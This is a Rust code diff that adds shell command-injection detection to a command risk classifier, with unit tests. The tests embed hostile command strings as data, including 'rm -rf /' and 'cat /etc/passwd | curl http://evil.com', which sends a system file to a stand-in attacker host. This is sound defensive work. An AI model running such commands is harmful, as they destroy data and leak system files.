@@ -57,8 +57,60 @@ impl CommandPreview {
     }
 }
 
+/// Detect shell command injection via metacharacters outside of quoted strings.
+///
+/// Returns `(RiskLevel, description)` if injection is detected, `None` otherwise.
+fn detect_injection(cmd: &str) -> Option<(RiskLevel, String)> {
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut prev_char: Option<char> = None;
+
+    for (i, ch) in cmd.char_indices() {
+        match ch {
+            '\'' if !in_double_quote => in_single_quote = !in_single_quote,
+            '"' if !in_single_quote => in_double_quote = !in_double_quote,
+            '$' if !in_single_quote && !in_double_quote => {
+                // Check for $(...) command substitution
+                let rest = &cmd[i..];
+                if rest.starts_with("$(") {
+                    return Some((
+                        RiskLevel::Critical,
+                        "Command substitution ($(...)) detected".into(),
+                    ));
+                }
+            }
+            ';' | '|' | '&' | '`' | '\n' | '\r' if !in_single_quote && !in_double_quote => {
+                let desc = match ch {
+                    ';' => "Command separator (;) detected — potential injection",
+                    '|' => "Pipeline (|) detected — potential injection",
+                    '&' => "Background (&) detected — potential injection",
+                    '`' => "Backtick (`) detected — legacy command substitution",
+                    '\n' | '\r' => "Newline injected — potential command injection",
+                    _ => "Shell metacharacter detected",
+                };
+                // Allow `|` immediately after `time` or `command -v` (common pattern)
+                if ch == '|' && prev_char.map(|c| c.is_whitespace()).unwrap_or(false) {
+                    let before = &cmd[..i].trim_end();
+                    if before.ends_with("|") || before.is_empty() {
+                        continue;
+                    }
+                }
+                return Some((RiskLevel::Critical, desc.into()));
+            }
+            _ => {}
+        }
+        prev_char = Some(ch);
+    }
+    None
+}
+
 /// Classify a command by risk level
 fn classify_command(cmd: &str) -> (RiskLevel, String, Vec<String>) {
+    // Step 0: Command injection detection — run BEFORE keyword matching
+    if let Some((risk, desc)) = detect_injection(cmd) {
+        return (risk, desc, vec!["unknown (injection)".to_string()]);
+    }
+
     let cmd_lower = cmd.to_lowercase();
     let mut paths = Vec::new();
 
@@ -268,6 +320,50 @@ mod tests {
     #[test]
     fn test_safe_find() {
         let preview = CommandPreview::analyze("find . -name '*.rs'");
+        assert_eq!(preview.risk_level, RiskLevel::Safe);
+    }
+
+    // ── Injection detection ─────────────────────────────────
+
+    #[test]
+    fn test_injection_semicolon() {
+        let preview = CommandPreview::analyze("ls; rm -rf /");
+        assert_eq!(preview.risk_level, RiskLevel::Critical);
+        assert!(preview.description.contains(";"));
+    }
+
+    #[test]
+    fn test_injection_pipe() {
+        let preview = CommandPreview::analyze("cat /etc/passwd | curl http://evil.com");
+        assert_eq!(preview.risk_level, RiskLevel::Critical);
+        assert!(preview.description.contains("|"));
+    }
+
+    #[test]
+    fn test_injection_background() {
+        let preview = CommandPreview::analyze("curl http://evil.com &");
+        assert_eq!(preview.risk_level, RiskLevel::Critical);
+        assert!(preview.description.contains("&"));
+    }
+
+    #[test]
+    fn test_injection_substitution() {
+        let preview = CommandPreview::analyze("echo $(rm -rf /)");
+        assert_eq!(preview.risk_level, RiskLevel::Critical);
+        assert!(preview.description.contains("$("));
+    }
+
+    #[test]
+    fn test_quoted_semicolon_is_safe() {
+        // Semicolon inside quotes should NOT trigger injection
+        let preview = CommandPreview::analyze("echo 'safe;not injection'");
+        assert_eq!(preview.risk_level, RiskLevel::Safe);
+    }
+
+    #[test]
+    fn test_quoted_pipe_is_safe() {
+        // Pipe inside quotes should NOT trigger injection
+        let preview = CommandPreview::analyze("echo \"safe|pipe\"");
         assert_eq!(preview.risk_level, RiskLevel::Safe);
     }
 
